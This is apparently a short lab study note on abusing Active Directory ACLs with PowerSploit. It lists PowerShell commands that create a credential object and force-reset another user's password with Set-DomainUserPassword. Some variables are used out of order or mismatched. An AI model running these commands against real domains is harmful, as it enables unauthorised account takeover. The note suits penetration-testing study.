# Abusing ACLs

- Kicking of the Attack Chain.

Abusing ACLs has to be done over Win.

[Set-DomainUserPassword - PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/)

<aside>
💡

Set Passwords.

</aside>

WE NEED TO USE THOSE 2 COMMANDS TO FIRST AUTHENTICATE AS THE USER (WHEN RUNNING THE ACL Attack , WE NEED TO BE THE USER)

Create a PSCredential Object.
`$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`

Set Second Passw$0rd.
`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`

Then we change the Passw0rd.
 `$AttackedAccNewPassw = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
`$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\user', $SecPassword)` 

 `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`

First Chain Attack in action.

![image.png](Abusing%20ACLs%20169357aeddc080fa8fc5cca78ad8fc87/image.png)

# Scripting ACL ENUM.

[https://github.com/Zin0D/ACLUsrEnum](https://github.com/Zin0D/ACLUsrEnum)